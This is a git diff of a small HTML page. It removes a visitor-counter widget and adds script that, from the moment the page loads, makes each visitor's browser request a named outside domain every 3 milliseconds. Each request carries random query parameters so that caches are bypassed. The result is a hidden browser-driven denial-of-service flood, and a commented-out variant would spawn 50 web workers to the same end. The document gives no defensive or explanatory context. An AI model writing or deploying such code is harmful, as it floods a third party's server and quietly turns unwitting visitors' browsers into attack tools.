@@ -1,7 +1,25 @@
 <html>
   <head>
+  	<script>
+
+  		/*
+  		var startreq = function() {
+
+	  		for(var i = 0; i< 50; i++) {
+	  			worker = new Worker("test.js");
+	  			worker.postMessage(new Image());
+			}
+
+		};
+		*/
+
+		var doreq = function(target) {
+			var pic = new Image();
+			pic.src = 'http://'+target+'/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+		};
+
+		var startreq = function() {setTimeout(function(){setInterval(function(){doreq("saunaetkiliatlet.com")}, 3);}, 10);};
+	</script>
   </head>
-<body>
-<script id="_waulxx">var _wau = _wau || []; _wau.push(["dynamic", "t3dmxmwv5q", "lxx", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>
-</body>
+<body onload="startreq()"></body>
 </html>
